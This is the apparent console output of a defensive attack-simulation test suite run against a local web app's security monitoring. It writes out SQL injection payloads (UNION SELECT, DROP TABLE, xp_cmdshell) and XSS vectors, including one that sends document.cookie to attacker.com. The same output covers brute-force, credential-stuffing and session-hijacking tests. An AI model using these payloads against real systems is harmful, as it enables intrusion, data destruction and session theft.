@@ -1,0 +1,317 @@
+
+
+╔════════════════════════════════════════════════════════════╗
+║       SECURITY ATTACK SIMULATION TEST SUITE               ║
+║                                                            ║
+║  This suite tests security monitoring capabilities         ║
+║  WITHOUT causing actual harm to the system                 ║
+╚════════════════════════════════════════════════════════════╝
+
+🕒 Started At: 5/12/2026, 11:00:46 AM
+
+✅ Server is running on http://localhost:3000
+Server Status Code: 403
+
+
+📋 Available Tests:
+  1. Brute Force Attack - Simulates multiple failed login attempts
+  2. SQL Injection - Tests SQL injection payload detection
+  3. XSS Attack - Tests cross-site scripting detection
+  4. DDoS Simulation - Simulates high-volume attack
+  5. Credential Stuffing - Tests leaked credentials against login
+  6. Session Hijacking - Tests stolen session token usage
+  7. Bot Detection - Tests automated bot detection
+
+⚠️ Running all tests sequentially...
+
+
+============================================================
+RUNNING: Brute Force Attack
+DESCRIPTION: Simulates multiple failed login attempts
+============================================================
+
+(node:24632) [MODULE_TYPELESS_PACKAGE_JSON] Warning: Module type of file:///D:/knowsamvidhan/generator/tests/brute-force.js is not specified and it doesn't parse as CommonJS.
+Reparsing as ES module because module syntax was detected. This incurs a performance overhead.
+To eliminate this warning, add "type": "module" to D:\knowsamvidhan\generator\package.json.
+(Use `node --trace-warnings ...` to show where the warning was created)
+
+🔴 Testing Brute Force Attack Simulation...
+
+Simulating 20 failed login attempts...
+
+  Attempt 1: Status 401
+  Attempt 2: Status 401
+  Attempt 3: Status 401
+  Attempt 4: Status 401
+  Attempt 5: Status 401
+  Attempt 6: Status 429
+  Attempt 7: Status 429
+  Attempt 8: Status 429
+  Attempt 9: Status 429
+  Attempt 10: Status 429
+  Attempt 11: Status 429
+  Attempt 12: Status 429
+  Attempt 13: Status 429
+  Attempt 14: Status 429
+  Attempt 15: Status 429
+  Attempt 16: Status 429
+  Attempt 17: Status 429
+  Attempt 18: Status 429
+  Attempt 19: Status 429
+  Attempt 20: Status 429
+
+✅ Brute Force Test Complete
+   Check Security Dashboard > Rate Limiting to see blocked attempts
+   Check Security Dashboard > Auth Logs for failed login records
+
+
+Test Exit Code: 0
+✅ Brute Force Attack COMPLETED
+
+============================================================
+RUNNING: SQL Injection
+DESCRIPTION: Tests SQL injection payload detection
+============================================================
+
+(node:5076) [MODULE_TYPELESS_PACKAGE_JSON] Warning: Module type of file:///D:/knowsamvidhan/generator/tests/sql-injection.js is not specified and it doesn't parse as CommonJS.
+Reparsing as ES module because module syntax was detected. This incurs a performance overhead.
+To eliminate this warning, add "type": "module" to D:\knowsamvidhan\generator\package.json.
+(Use `node --trace-warnings ...` to show where the warning was created)
+
+🟠 Testing SQL Injection Attack Simulation...
+
+Sending various SQL injection payloads...
+
+  Payload: "' OR '1'='1..." on /api/articles?search='%20OR%20'1'%3D'1 → Status 403
+  Payload: "' OR '1'='1..." on /api/parts?filter='%20OR%20'1'%3D'1 → Status 403
+  Payload: "' OR '1'='1..." on /api/amendments?q='%20OR%20'1'%3D'1 → Status 403
+  Payload: "' OR '1'='1' --..." on /api/articles?search='%20OR%20'1'%3D'1'%20-- → Status 403
+  Payload: "' OR '1'='1' --..." on /api/parts?filter='%20OR%20'1'%3D'1'%20-- → Status 403
+  Payload: "' OR '1'='1' --..." on /api/amendments?q='%20OR%20'1'%3D'1'%20-- → Status 403
+  Payload: "admin' --..." on /api/articles?search=admin'%20-- → Status 403
+  Payload: "admin' --..." on /api/parts?filter=admin'%20-- → Status 403
+  Payload: "admin' --..." on /api/amendments?q=admin'%20-- → Status 403
+  Payload: "1; DROP TABLE users;..." on /api/articles?search=1%3B%20DROP%20TABLE%20users%3B → Status 403
+  Payload: "1; DROP TABLE users;..." on /api/parts?filter=1%3B%20DROP%20TABLE%20users%3B → Status 403
+  Payload: "1; DROP TABLE users;..." on /api/amendments?q=1%3B%20DROP%20TABLE%20users%3B → Status 403
+  Payload: "1' UNION SELECT * FROM users--..." on /api/articles?search=1'%20UNION%20SELECT%20*%20FROM%20users-- → Status 403
+  Payload: "1' UNION SELECT * FROM users--..." on /api/parts?filter=1'%20UNION%20SELECT%20*%20FROM%20users-- → Status 403
+  Payload: "1' UNION SELECT * FROM users--..." on /api/amendments?q=1'%20UNION%20SELECT%20*%20FROM%20users-- → Status 403
+  Payload: "'; EXEC xp_cmdshell('dir'); --..." on /api/articles?search='%3B%20EXEC%20xp_cmdshell('dir')%3B%20-- → Status 403
+  Payload: "'; EXEC xp_cmdshell('dir'); --..." on /api/parts?filter='%3B%20EXEC%20xp_cmdshell('dir')%3B%20-- → Status 403
+  Payload: "'; EXEC xp_cmdshell('dir'); --..." on /api/amendments?q='%3B%20EXEC%20xp_cmdshell('dir')%3B%20-- → Status 403
+  Payload: "' OR 1=1--..." on /api/articles?search='%20OR%201%3D1-- → Status 403
+  Payload: "' OR 1=1--..." on /api/parts?filter='%20OR%201%3D1-- → Status 403
+  Payload: "' OR 1=1--..." on /api/amendments?q='%20OR%201%3D1-- → Status 403
+  Payload: "1' AND '1'='1..." on /api/articles?search=1'%20AND%20'1'%3D'1 → Status 403
+  Payload: "1' AND '1'='1..." on /api/parts?filter=1'%20AND%20'1'%3D'1 → Status 403
+  Payload: "1' AND '1'='1..." on /api/amendments?q=1'%20AND%20'1'%3D'1 → Status 403
+  Payload: "1' OR '1'='1' /*..." on /api/articles?search=1'%20OR%20'1'%3D'1'%20%2F* → Status 403
+  Payload: "1' OR '1'='1' /*..." on /api/parts?filter=1'%20OR%20'1'%3D'1'%20%2F* → Status 403
+  Payload: "1' OR '1'='1' /*..." on /api/amendments?q=1'%20OR%20'1'%3D'1'%20%2F* → Status 403
+  Payload: "'; WAITFOR DELAY '00:00:05'--..." on /api/articles?search='%3B%20WAITFOR%20DELAY%20'00%3A00%3A05'-- → Status 403
+  Payload: "'; WAITFOR DELAY '00:00:05'--..." on /api/parts?filter='%3B%20WAITFOR%20DELAY%20'00%3A00%3A05'-- → Status 403
+  Payload: "'; WAITFOR DELAY '00:00:05'--..." on /api/amendments?q='%3B%20WAITFOR%20DELAY%20'00%3A00%3A05'-- → Status 403
+
+✅ SQL Injection Test Complete
+   Check Security Dashboard > Threat Analysis for detected threats
+   Check Security Dashboard > Auth Logs for suspicious requests
+
+
+Test Exit Code: 0
+✅ SQL Injection COMPLETED
+
+============================================================
+RUNNING: XSS Attack
+DESCRIPTION: Tests cross-site scripting detection
+============================================================
+
+(node:32484) [MODULE_TYPELESS_PACKAGE_JSON] Warning: Module type of file:///D:/knowsamvidhan/generator/tests/xss-attack.js is not specified and it doesn't parse as CommonJS.
+Reparsing as ES module because module syntax was detected. This incurs a performance overhead.
+To eliminate this warning, add "type": "module" to D:\knowsamvidhan\generator\package.json.
+(Use `node --trace-warnings ...` to show where the warning was created)
+
+🟡 Testing XSS (Cross-Site Scripting) Attack Simulation...
+
+Sending various XSS payloads...
+
+  Payload: "<script>alert("XSS")</scr..." on /api/feedback?comment=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E → Status 405
+  Payload: "<script>alert("XSS")</scr..." on /api/articles?title=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E → Status 403
+  Payload: "<script>alert("XSS")</scr..." on /api/search?q=%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E → Status 404
+  Payload: "<img src=x onerror=alert(..." on /api/feedback?comment=%3Cimg%20src%3Dx%20onerror%3Dalert(%22XSS%22)%3E → Status 405
+  Payload: "<img src=x onerror=alert(..." on /api/articles?title=%3Cimg%20src%3Dx%20onerror%3Dalert(%22XSS%22)%3E → Status 403
+  Payload: "<img src=x onerror=alert(..." on /api/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(%22XSS%22)%3E → Status 404
+  Payload: "<svg onload=alert("XSS")>..." on /api/feedback?comment=%3Csvg%20onload%3Dalert(%22XSS%22)%3E → Status 405
+  Payload: "<svg onload=alert("XSS")>..." on /api/articles?title=%3Csvg%20onload%3Dalert(%22XSS%22)%3E → Status 403
+  Payload: "<svg onload=alert("XSS")>..." on /api/search?q=%3Csvg%20onload%3Dalert(%22XSS%22)%3E → Status 404
+  Payload: "javascript:alert("XSS")..." on /api/feedback?comment=javascript%3Aalert(%22XSS%22) → Status 405
+  Payload: "javascript:alert("XSS")..." on /api/articles?title=javascript%3Aalert(%22XSS%22) → Status 403
+  Payload: "javascript:alert("XSS")..." on /api/search?q=javascript%3Aalert(%22XSS%22) → Status 404
+  Payload: "<body onload=alert("XSS")..." on /api/feedback?comment=%3Cbody%20onload%3Dalert(%22XSS%22)%3E → Status 405
+  Payload: "<body onload=alert("XSS")..." on /api/articles?title=%3Cbody%20onload%3Dalert(%22XSS%22)%3E → Status 403
+  Payload: "<body onload=alert("XSS")..." on /api/search?q=%3Cbody%20onload%3Dalert(%22XSS%22)%3E → Status 404
+  Payload: "<iframe src="javascript:a..." on /api/feedback?comment=%3Ciframe%20src%3D%22javascript%3Aalert(%22XSS%22)%22%3E → Status 405
+  Payload: "<iframe src="javascript:a..." on /api/articles?title=%3Ciframe%20src%3D%22javascript%3Aalert(%22XSS%22)%22%3E → Status 403
+  Payload: "<iframe src="javascript:a..." on /api/search?q=%3Ciframe%20src%3D%22javascript%3Aalert(%22XSS%22)%22%3E → Status 404
+  Payload: "<script>document.location..." on /api/feedback?comment=%3Cscript%3Edocument.location%3D%22http%3A%2F%2Fattacker.com%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E → Status 405
+  Payload: "<script>document.location..." on /api/articles?title=%3Cscript%3Edocument.location%3D%22http%3A%2F%2Fattacker.com%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E → Status 403
+  Payload: "<script>document.location..." on /api/search?q=%3Cscript%3Edocument.location%3D%22http%3A%2F%2Fattacker.com%3Fcookie%3D%22%2Bdocument.cookie%3C%2Fscript%3E → Status 404
+  Payload: "<input onfocus=alert("XSS..." on /api/feedback?comment=%3Cinput%20onfocus%3Dalert(%22XSS%22)%20autofocus%3E → Status 405
+  Payload: "<input onfocus=alert("XSS..." on /api/articles?title=%3Cinput%20onfocus%3Dalert(%22XSS%22)%20autofocus%3E → Status 403
+  Payload: "<input onfocus=alert("XSS..." on /api/search?q=%3Cinput%20onfocus%3Dalert(%22XSS%22)%20autofocus%3E → Status 404
+  Payload: "<marquee onstart=alert("X..." on /api/feedback?comment=%3Cmarquee%20onstart%3Dalert(%22XSS%22)%3E → Status 405
+  Payload: "<marquee onstart=alert("X..." on /api/articles?title=%3Cmarquee%20onstart%3Dalert(%22XSS%22)%3E → Status 403
+  Payload: "<marquee onstart=alert("X..." on /api/search?q=%3Cmarquee%20onstart%3Dalert(%22XSS%22)%3E → Status 404
+  Payload: "<link rel="import" href="..." on /api/feedback?comment=%3Clink%20rel%3D%22import%22%20href%3D%22javascript%3Aalert(%22XSS%22)%22%3E → Status 405
+  Payload: "<link rel="import" href="..." on /api/articles?title=%3Clink%20rel%3D%22import%22%20href%3D%22javascript%3Aalert(%22XSS%22)%22%3E → Status 403
+  Payload: "<link rel="import" href="..." on /api/search?q=%3Clink%20rel%3D%22import%22%20href%3D%22javascript%3Aalert(%22XSS%22)%22%3E → Status 404
+
+✅ XSS Attack Test Complete
+   Check Security Dashboard > Threat Analysis
+   XSS attacks should be detected and logged
+
+
+Test Exit Code: 0
+✅ XSS Attack COMPLETED
+
+============================================================
+RUNNING: DDoS Simulation
+DESCRIPTION: Simulates high-volume attack
+============================================================
+
+(node:37992) [MODULE_TYPELESS_PACKAGE_JSON] Warning: Module type of file:///D:/knowsamvidhan/generator/tests/ddos-simulation.js is not specified and it doesn't parse as CommonJS.
+Reparsing as ES module because module syntax was detected. This incurs a performance overhead.
+To eliminate this warning, add "type": "module" to D:\knowsamvidhan\generator\package.json.
+(Use `node --trace-warnings ...` to show where the warning was created)
+
+🔵 Testing DDoS (Distributed Denial of Service) Simulation...
+
+Simulating high-volume requests from multiple sources...
+
+  Batch 1/3: Sending 50 requests...
+    Completed: 50 success, 0 failed
+  Batch 2/3: Sending 50 requests...
+    Completed: 100 success, 0 failed
+  Batch 3/3: Sending 50 requests...
+    Completed: 150 success, 0 failed
+
+✅ DDoS Simulation Complete
+   Total Requests: 150
+   Successful: 150
+   Failed: 0
+   Check Security Dashboard > Rate Limiting for blocked requests
+   Check Security Dashboard > Threat Analysis for DDoS detection
+
+
+Test Exit Code: 0
+✅ DDoS Simulation COMPLETED
+
+============================================================
+RUNNING: Credential Stuffing
+DESCRIPTION: Tests leaked credentials against login
+============================================================
+
+(node:28832) [MODULE_TYPELESS_PACKAGE_JSON] Warning: Module type of file:///D:/knowsamvidhan/generator/tests/credential-stuffing.js is not specified and it doesn't parse as CommonJS.
+Reparsing as ES module because module syntax was detected. This incurs a performance overhead.
+To eliminate this warning, add "type": "module" to D:\knowsamvidhan\generator\package.json.
+(Use `node --trace-warnings ...` to show where the warning was created)
+
+🟣 Testing Credential Stuffing Attack Simulation...
+
+Testing leaked credentials against login endpoint...
+
+  ✗ john.doe@gmail.com → Status 429
+  ✗ admin@admin.com → Status 429
+  ✗ test@test.com → Status 429
+  ✗ user@user.com → Status 429
+  ✗ demo@demo.com → Status 429
+  ✗ admin@gmail.com → Status 429
+  ✗ testuser@yahoo.com → Status 429
+  ✗ admin123@company.com → Status 429
+
+✅ Credential Stuffing Test Complete
+   Credentials Tested: 8
+   Successful Logins: 0
+   Check Security Dashboard > Fraud Monitoring for detected attacks
+   Check Security Dashboard > Threat Analysis
+
+
+Test Exit Code: 0
+✅ Credential Stuffing COMPLETED
+
+============================================================
+RUNNING: Session Hijacking
+DESCRIPTION: Tests stolen session token usage
+============================================================
+
+(node:2560) [MODULE_TYPELESS_PACKAGE_JSON] Warning: Module type of file:///D:/knowsamvidhan/generator/tests/session-hijack.js is not specified and it doesn't parse as CommonJS.
+Reparsing as ES module because module syntax was detected. This incurs a performance overhead.
+To eliminate this warning, add "type": "module" to D:\knowsamvidhan\generator\package.json.
+(Use `node --trace-warnings ...` to show where the warning was created)
+
+🟢 Testing Session Hijacking Attack Simulation...
+
+Attempting requests with stolen/tampered session tokens...
+
+  Attempt with token: session_abc123def456... → Status 401
+  Attempt with token: session_xyz789uvw012... → Status 405
+  Attempt with token: session_invalid_toke... → Status 404
+  Attempt with token: session_tampered_abc... → Status 429
+  Attempt with token: session_expired_2024... → Status 401
+  Attempt with token: session_forged_sessi... → Status 405
+  Attempt with token: session_hijacked_tok... → Status 404
+  Attempt with token: random_invalid_sessi... → Status 429
+
+✅ Session Hijacking Test Complete
+   Check Security Dashboard > Auth Logs for suspicious session activity
+   Check Security Dashboard > Threat Analysis for detected hijacking attempts
+
+
+Test Exit Code: 0
+✅ Session Hijacking COMPLETED
+
+============================================================
+RUNNING: Bot Detection
+DESCRIPTION: Tests automated bot detection
+============================================================
+
+(node:12600) [MODULE_TYPELESS_PACKAGE_JSON] Warning: Module type of file:///D:/knowsamvidhan/generator/tests/bot-detection.js is not specified and it doesn't parse as CommonJS.
+Reparsing as ES module because module syntax was detected. This incurs a performance overhead.
+To eliminate this warning, add "type": "module" to D:\knowsamvidhan\generator\package.json.
+(Use `node --trace-warnings ...` to show where the warning was created)
+
+⚫ Testing Bot Swarm Detection Simulation...
+
+Sending requests with various bot user agents...
+
+  Bot: Mozilla → /api/articles → Status 429
+  Bot: Mozilla → /api/parts → Status 429
+  Bot: Mozilla → /api/amendments → Status 429
+  Bot: Python-urllib → /api/schedules → Status 200
+  Bot: curl → /api/preamble → Status 200
+  Bot: Wget → /api/auth/login → Status 405
+  Bot: Apache-HttpClient → /api/feedback → Status 405
+  Bot: Scrapy → /api/user/analytics → Status 404
+  Bot: Bot → /api/admin/users → Status 401
+  Bot: python-requests → /api/admin/analytics → Status 401
+
+✅ Bot Swarm Detection Test Complete
+   Check Security Dashboard > Threat Analysis for bot detection logs
+   Check Security Dashboard > Rate Limiting for blocked bot traffic
+
+
+Test Exit Code: 0
+✅ Bot Detection COMPLETED
+
+
+╔════════════════════════════════════════════════════════════╗
+║                    ALL TESTS COMPLETE                     ║
+╚════════════════════════════════════════════════════════════╝
+
+📊 After running tests, verify security monitoring:
+   1. Go to /security/threat_analysis
+   2. Check /security/rate-limiting
+   3. Review /security/auth-logs
+   4. Check /security/fraud-monitoring
+
+🕒 Completed At: 5/12/2026, 11:01:44 AM
